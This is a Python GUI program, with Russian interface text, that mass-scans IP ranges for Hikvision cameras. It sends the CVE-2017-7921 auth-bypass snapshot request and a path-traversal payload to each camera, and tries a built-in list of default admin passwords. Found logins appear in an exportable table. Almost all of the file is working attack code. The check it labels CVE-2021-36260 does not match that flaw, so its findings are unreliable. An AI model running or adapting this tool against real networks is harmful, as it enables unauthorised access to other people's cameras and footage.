import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import socket
import threading
import ipaddress
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
import base64
import webbrowser
import os
import subprocess
import re
from datetime import datetime

class HikvisionScanner:
    def __init__(self, root):
        self.root = root
        self.root.title("Hikvision Vulnerability Scanner")
        self.root.geometry("1100x750")
        self.root.resizable(True, True)
        
        # Иконка для Windows
        try:
            self.root.iconbitmap(default='hikvision.ico')
        except:
            pass
        
        # Стиль для Windows
        self.style = ttk.Style()
        self.style.theme_use('winnative')
        
        # Цвета
        bg_color = "#f0f0f0"
        fg_color = "#000000"
        button_bg = "#e1e1e1"
        highlight_color = "#0078d7"
        
        self.root.configure(bg=bg_color)
        
        # Главный фрейм
        self.main_frame = tk.Frame(root, bg=bg_color)
        self.main_frame.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)
        
        # Фрейм настроек сканирования
        self.settings_frame = tk.LabelFrame(self.main_frame, text="Настройки сканирования", bg=bg_color, fg=fg_color)
        self.settings_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Выбор источника IP
        self.ip_source = tk.IntVar(value=1)
        ttk.Radiobutton(self.settings_frame, text="Диапазон IP", variable=self.ip_source, value=1).grid(row=0, column=0, padx=5, pady=5)
        ttk.Radiobutton(self.settings_frame, text="Загрузить из файла", variable=self.ip_source, value=2).grid(row=0, column=1, padx=5, pady=5)
        
        # Начальный IP
        ttk.Label(self.settings_frame, text="Начальный IP:", background=bg_color).grid(row=1, column=0, padx=5, pady=5)
        self.start_ip = ttk.Entry(self.settings_frame)
        self.start_ip.grid(row=1, column=1, padx=5, pady=5)
        self.start_ip.insert(0, "192.168.1.1")
        
        # Конечный IP
        ttk.Label(self.settings_frame, text="Конечный IP:", background=bg_color).grid(row=1, column=2, padx=5, pady=5)
        self.end_ip = ttk.Entry(self.settings_frame)
        self.end_ip.grid(row=1, column=3, padx=5, pady=5)
        self.end_ip.insert(0, "192.168.1.254")
        
        # Кнопка загрузки файла
        self.load_file_btn = ttk.Button(self.settings_frame, text="Выбрать файл", command=self.load_ips_from_file)
        self.load_file_btn.grid(row=1, column=4, padx=5, pady=5)
        
        # Порт Hikvision
        ttk.Label(self.settings_frame, text="Порт:", background=bg_color).grid(row=2, column=0, padx=5, pady=5)
        self.port_entry = ttk.Entry(self.settings_frame)
        self.port_entry.grid(row=2, column=1, padx=5, pady=5)
        self.port_entry.insert(0, "80")
        
        # Проверка уязвимостей
        self.check_vulns = tk.BooleanVar(value=True)
        ttk.Checkbutton(self.settings_frame, text="Проверять уязвимости", variable=self.check_vulns).grid(row=2, column=2, padx=5, pady=5)
        
        # Проверка паролей
        self.check_passwords = tk.BooleanVar(value=True)
        ttk.Checkbutton(self.settings_frame, text="Проверять пароли", variable=self.check_passwords).grid(row=2, column=3, padx=5, pady=5)
        
        # Кнопки управления
        self.scan_button = ttk.Button(self.settings_frame, text="Начать сканирование", command=self.start_scan)
        self.scan_button.grid(row=2, column=4, padx=5, pady=5)
        
        self.stop_button = ttk.Button(self.settings_frame, text="Остановить", command=self.stop_scan_func, state=tk.DISABLED)
        self.stop_button.grid(row=2, column=5, padx=5, pady=5)
        
        # Прогресс бар
        self.progress = ttk.Progressbar(self.main_frame, orient=tk.HORIZONTAL, length=100, mode='determinate')
        self.progress.pack(fill=tk.X, pady=(0, 10))
        
        # Фрейм результатов
        self.results_frame = tk.LabelFrame(self.main_frame, text="Результаты сканирования", bg=bg_color, fg=fg_color)
        self.results_frame.pack(fill=tk.BOTH, expand=True)
        
        # Таблица результатов
        self.tree = ttk.Treeview(self.results_frame, columns=("IP", "Port", "Model", "Firmware", "Vulnerabilities", "Auth", "Status"), show="headings")
        self.tree.heading("IP", text="IP адрес")
        self.tree.heading("Port", text="Порт")
        self.tree.heading("Model", text="Модель")
        self.tree.heading("Firmware", text="Версия ПО")
        self.tree.heading("Vulnerabilities", text="Уязвимости")
        self.tree.heading("Auth", text="Аутентификация")
        self.tree.heading("Status", text="Статус")
        
        self.tree.column("IP", width=120)
        self.tree.column("Port", width=60)
        self.tree.column("Model", width=150)
        self.tree.column("Firmware", width=100)
        self.tree.column("Vulnerabilities", width=200)
        self.tree.column("Auth", width=150)
        self.tree.column("Status", width=150)
        
        self.tree.pack(fill=tk.BOTH, expand=True)
        
        # Полоса прокрутки
        scrollbar = ttk.Scrollbar(self.tree, orient="vertical", command=self.tree.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.configure(yscrollcommand=scrollbar.set)
        
        # Контекстное меню
        self.context_menu = tk.Menu(root, tearoff=0)
        self.context_menu.add_command(label="Открыть в браузере", command=self.open_in_browser)
        self.context_menu.add_command(label="Скопировать IP", command=self.copy_ip)
        self.context_menu.add_command(label="Проверить PING", command=self.ping_camera)
        self.context_menu.add_command(label="Экспорт в CSV", command=self.export_to_csv)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Проверить все пароли", command=self.test_all_passwords_for_selected)
        self.context_menu.add_command(label="Проверить уязвимости", command=self.test_vulnerabilities_for_selected)
        
        self.tree.bind("<Button-3>", self.show_context_menu)
        
        # Статус бар
        self.status = tk.StringVar()
        self.status.set("Готов к работе")
        self.status_bar = ttk.Label(root, textvariable=self.status, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Флаг остановки сканирования
        self.stop_scan_flag = False
        self.current_ips = []
        
        # Известные уязвимости Hikvision
        self.vulnerabilities = {
            "CVE-2017-7921": "Доступ к изображению без аутентификации",
            "CVE-2021-36260": "RCE через API веб-интерфейса",
            "CVE-2014-4878": "Фиксированный криптографический ключ",
            "CVE-2020-25078": "XSS в веб-интерфейсе"
        }
        
        # Популярные пароли Hikvision
        self.common_passwords = [
            ("admin", "12345"),
            ("admin", "admin"),
            ("admin", "123456"),
            ("admin", "hikvision"),
            ("admin", "password"),
            ("admin", "admin1234"),
            ("admin", "111111"),
            ("admin", "1234"),
            ("admin", "12345678"),
            ("admin", "123456789"),
            ("admin", "888888"),
            ("admin", "54321"),
            ("service", "service"),
            ("operator", "operator")
        ]
    
    def load_ips_from_file(self):
        filepath = filedialog.askopenfilename(
            filetypes=[("Текстовые файлы", "*.txt"), ("Все файлы", "*.*")],
            title="Выберите файл с IP-адресами"
        )
        if filepath:
            try:
                with open(filepath, 'r') as f:
                    ips = [line.strip() for line in f if line.strip()]
                    self.current_ips = ips
                    messagebox.showinfo("Успешно", f"Загружено {len(ips)} IP-адресов из файла")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось загрузить файл: {str(e)}")
    
    def show_context_menu(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            self.context_menu.tk_popup(event.x_root, event.y_root)
    
    def open_in_browser(self):
        selected = self.tree.selection()
        if selected:
            item = self.tree.item(selected[0])
            ip = item['values'][0]
            port = item['values'][1]
            webbrowser.open(f"http://{ip}:{port}")
    
    def copy_ip(self):
        selected = self.tree.selection()
        if selected:
            item = self.tree.item(selected[0])
            ip = item['values'][0]
            self.root.clipboard_clear()
            self.root.clipboard_append(ip)
            self.status.set(f"IP-адрес {ip} скопирован в буфер обмена")
    
    def ping_camera(self):
        selected = self.tree.selection()
        if selected:
            item = self.tree.item(selected[0])
            ip = item['values'][0]
            
            def ping(ip):
                try:
                    # Используем ping для Windows
                    param = '-n' if os.name == 'nt' else '-c'
                    command = ['ping', param, '2', ip]
                    output = subprocess.run(command, capture_output=True, text=True, timeout=5)
                    
                    if "TTL=" in output.stdout:
                        messagebox.showinfo("PING", f"Камера {ip} доступна")
                    else:
                        messagebox.showerror("PING", f"Камера {ip} недоступна")
                except subprocess.TimeoutExpired:
                    messagebox.showerror("PING", f"Таймаут при проверке {ip}")
                except Exception as e:
                    messagebox.showerror("Ошибка", f"Ошибка при проверке PING: {str(e)}")
            
            # Запускаем ping в отдельном потоке
            threading.Thread(target=ping, args=(ip,), daemon=True).start()
    
    def export_to_csv(self):
        filepath = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV файлы", "*.csv"), ("Все файлы", "*.*")],
            title="Сохранить результаты как CSV"
        )
        if filepath:
            try:
                with open(filepath, 'w', encoding='utf-8') as f:
                    # Заголовки
                    f.write("IP адрес;Порт;Модель;Версия ПО;Уязвимости;Аутентификация;Статус\n")
                    
                    # Данные
                    for child in self.tree.get_children():
                        values = self.tree.item(child)['values']
                        line = ";".join(str(v) for v in values) + "\n"
                        f.write(line)
                
                messagebox.showinfo("Успешно", f"Результаты сохранены в {filepath}")
                self.status.set(f"Экспорт завершен: {filepath}")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось сохранить файл: {str(e)}")
    
    def test_all_passwords_for_selected(self):
        selected = self.tree.selection()
        if selected:
            item = self.tree.item(selected[0])
            ip = item['values'][0]
            port = item['values'][1]
            
            self.scan_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.DISABLED)
            
            threading.Thread(
                target=self.test_passwords,
                args=(ip, port, True),  # Проверка всех паролей
                daemon=True
            ).start()
    
    def test_vulnerabilities_for_selected(self):
        selected = self.tree.selection()
        if selected:
            item = self.tree.item(selected[0])
            ip = item['values'][0]
            port = item['values'][1]
            
            self.scan_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.DISABLED)
            
            threading.Thread(
                target=self.check_hikvision_vulnerabilities,
                args=(ip, port),
                daemon=True
            ).start()
    
    def start_scan(self):
        try:
            port = int(self.port_entry.get())
            
            # Очистка предыдущих результатов
            for item in self.tree.get_children():
                self.tree.delete(item)
                
            # Настройка интерфейса
            self.scan_button.config(state=tk.DISABLED, text="Сканирование...")
            self.stop_button.config(state=tk.NORMAL)
            self.stop_scan_flag = False
            
            # Получение IP-адресов для сканирования
            if self.ip_source.get() == 1:  # Диапазон IP
                start_ip = self.start_ip.get()
                end_ip = self.end_ip.get()
                ips = self.generate_ip_range(start_ip, end_ip)
            else:  # Из файла
                ips = self.current_ips if self.current_ips else []
                if not ips:
                    messagebox.showwarning("Предупреждение", "Не загружены IP-адреса из файла")
                    self.scan_button.config(state=tk.NORMAL, text="Начать сканирование")
                    self.stop_button.config(state=tk.DISABLED)
                    return
            
            # Запуск сканирования в отдельном потоке
            scan_thread = threading.Thread(
                target=self.scan_network,
                args=(ips, port, self.check_vulns.get(), self.check_passwords.get()),
                daemon=True
            )
            scan_thread.start()
            
        except ValueError as e:
            messagebox.showerror("Ошибка", f"Некорректный ввод: {str(e)}")
            self.scan_button.config(state=tk.NORMAL, text="Начать сканирование")
            self.stop_button.config(state=tk.DISABLED)
    
    def stop_scan_func(self):
        self.stop_scan_flag = True
        self.status.set("Остановка сканирования...")
        self.stop_button.config(state=tk.DISABLED)
    
    def generate_ip_range(self, start_ip, end_ip):
        start = list(map(int, start_ip.split('.')))
        end = list(map(int, end_ip.split('.')))
        ips = []
        
        for a in range(start[0], end[0]+1):
            for b in range(start[1], end[1]+1):
                for c in range(start[2], end[2]+1):
                    for d in range(start[3], end[3]+1):
                        ips.append(f"{a}.{b}.{c}.{d}")
        return ips
    
    def scan_network(self, ips, port, check_vulns, check_passwords):
        try:
            total_ips = len(ips)
            
            for i, ip in enumerate(ips):
                if self.stop_scan_flag:
                    self.update_status("Сканирование остановлено пользователем")
                    break
                    
                # Обновление прогресса
                progress = ((i + 1) / total_ips) * 100
                self.progress['value'] = progress
                self.update_status(f"Сканирование {ip} ({i+1}/{total_ips})...")
                
                # Проверка порта
                if self.check_port(ip, port):
                    model, firmware = self.get_hikvision_info(ip, port)
                    vulns = []
                    auth = "Не проверялось"
                    
                    # Проверка уязвимостей
                    if check_vulns:
                        vulns = self.check_hikvision_vulnerabilities(ip, port)
                    
                    # Проверка паролей
                    if check_passwords:
                        auth = self.test_passwords(ip, port, False)  # Только быстрая проверка
                    
                    # Добавление результата
                    self.add_result(
                        ip, port, model or "Не определено", 
                        firmware or "Не определена", 
                        ", ".join(vulns) if vulns else "Не обнаружено", 
                        auth, 
                        "Обнаружена" if model else "Порт открыт"
                    )
            
            self.update_status("Сканирование завершено")
            self.scan_button.config(state=tk.NORMAL, text="Начать сканирование")
            self.stop_button.config(state=tk.DISABLED)
            
        except Exception as e:
            self.update_status(f"Ошибка: {str(e)}")
            self.scan_button.config(state=tk.NORMAL, text="Начать сканирование")
            self.stop_button.config(state=tk.DISABLED)
    
    def check_port(self, ip, port, timeout=1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                result = s.connect_ex((ip, port))
                return result == 0
        except:
            return False
    
    def get_hikvision_info(self, ip, port):
        try:
            url = f"http://{ip}:{port}/System/deviceInfo"
            req = Request(url)
            
            with urlopen(req, timeout=3) as response:
                if response.getcode() == 200:
                    content = response.read().decode('utf-8', errors='ignore')
                    
                    # Парсим модель
                    model_match = re.search(r'<deviceName>(.*?)</deviceName>', content)
                    model = model_match.group(1) if model_match else None
                    
                    # Парсим версию firmware
                    firmware_match = re.search(r'<firmwareVersion>(.*?)</firmwareVersion>', content)
                    firmware = firmware_match.group(1) if firmware_match else None
                    
                    return model, firmware
        except:
            pass
        
        return None, None
    
    def check_hikvision_vulnerabilities(self, ip, port):
        detected_vulns = []
        
        # CVE-2017-7921 - Доступ к изображению без аутентификации
        try:
            url = f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK"
            req = Request(url)
            
            with urlopen(req, timeout=3) as response:
                if response.getcode() == 200:
                    content_type = response.getheader('Content-Type', '')
                    if 'image' in content_type:
                        detected_vulns.append("CVE-2017-7921")
        except:
            pass
        
        # CVE-2021-36260 - RCE через API
        try:
            url = f"http://{ip}:{port}/SDK/webLanguage"
            req = Request(url, data=b"<?xml version='1.0' encoding='UTF-8'?><language>../../../windows/win.ini</language>")
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urlopen(req, timeout=3) as response:
                if response.getcode() == 200:
                    content = response.read().decode('utf-8', errors='ignore')
                    if 'for 16-bit app support' in content:
                        detected_vulns.append("CVE-2021-36260")
        except:
            pass
        
        # Обновление интерфейса для выбранной камеры
        if detected_vulns:
            for child in self.tree.get_children():
                values = self.tree.item(child)['values']
                if values[0] == ip and str(values[1]) == str(port):
                    self.tree.item(child, values=(
                        values[0], values[1], values[2], values[3], 
                        ", ".join(detected_vulns), values[5], values[6]
                    ))
                    break
        
        return detected_vulns
    
    def test_passwords(self, ip, port, test_all=False):
        max_attempts = len(self.common_passwords) if test_all else min(5, len(self.common_passwords))
        found_auth = None
        
        for i in range(max_attempts):
            if self.stop_scan_flag:
                return "Проверка остановлена"
                
            username, password = self.common_passwords[i]
            auth_str = f"{username}:{password}"
            auth_bytes = auth_str.encode('ascii')
            base64_bytes = base64.b64encode(auth_bytes)
            base64_str = base64_bytes.decode('ascii')
            
            headers = {'Authorization': f'Basic {base64_str}'}
            req = Request(f"http://{ip}:{port}", headers=headers)
            
            try:
                with urlopen(req, timeout=3) as response:
                    if response.getcode() == 200:
                        found_auth = f"{username}/{password}"
                        break
            except HTTPError as e:
                if e.code == 401:
                    continue  # Неверные учетные данные
            except:
                continue
        
        # Обновление интерфейса для выбранной камеры
        if found_auth:
            for child in self.tree.get_children():
                values = self.tree.item(child)['values']
                if values[0] == ip and str(values[1]) == str(port):
                    self.tree.item(child, values=(
                        values[0], values[1], values[2], values[3], 
                        values[4], found_auth, values[6]
                    ))
                    break
        
        result = found_auth or ("Не найдено" if test_all else "Быстрая проверка: не найдено")
        self.update_status(f"Проверка паролей для {ip}:{port} завершена: {result}")
        self.scan_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        
        return result
    
    def add_result(self, ip, port, model, firmware, vulnerabilities, auth, status):
        self.root.after(0, lambda: self.tree.insert(
            "", tk.END, 
            values=(ip, port, model, firmware, vulnerabilities, auth, status)
        ))
    
    def update_status(self, message):
        self.root.after(0, lambda: self.status.set(f"{datetime.now().strftime('%H:%M:%S')} - {message}"))

if __name__ == "__main__":
    root = tk.Tk()
    app = HikvisionScanner(root)
    root.mainloop()